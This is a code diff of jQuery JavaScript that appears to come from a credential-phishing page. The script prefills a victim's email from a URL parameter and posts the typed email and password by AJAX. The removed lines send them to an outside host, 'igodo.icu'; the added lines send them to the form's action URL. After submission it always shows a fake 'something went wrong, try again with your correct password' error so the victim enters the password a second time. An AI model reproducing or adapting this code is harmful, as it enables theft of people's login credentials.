@@ -4,7 +4,7 @@
     const emailauto = params_url.get('e');
     
     $(document).ready(function(){
-        var count = 0;
+        var cou_nt = 0;
         var form_error = [false, false];
     
     
@@ -52,17 +52,15 @@
             }
     
             $.ajax({
-                url: "https://igodo.icu/5534e3-5229a1-78462a/b.php",
-                type: 'POST',
-		dataType: 'text',
-                data: formData,
-		contentType: false
-                processData: false,
+                url: $('#gawaboy').attr('action'),
+                method: "post",
+                data: {email: input4email, password: input4passwd},
+                processData: true,
                 beforeSend: function(xhr){
                     $('#showerror').removeClass('alert').text('')
-                    $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', false);
+                    $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', true);
                 },                        
-                complete: function(feedback) {
+                success: function(feedback) {
                        $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password")
                        console.log(feedback);
                        // return false;
@@ -92,6 +90,33 @@
     
         });  	
     
-   
+    // $confirm("Do you want to delete?", "#E74C3C")
+    //   .then(() => {
+    //      $toast("Deleted", "#E74C3C");
+    // })
+    
+      
+    // $alert("<i>Successfull</i>", '#E74C3C') 
+    // $toast("No internet connection", "#F4D03F")
+    
+    // $loader_hide()
+        // if (emailauto !='') {
+        // 	$('#correo').val(autoemail);
+        // }
+    
+    
+    
+    
+    
+    
+     });
+    
+    
+          // console.log('sdasd');
+    
+    
+      // $(function(){
+      //   $('.sidenav').sidenav();
+      // }); // end of document ready
     
     })(jQuery); // end of jQuery name space
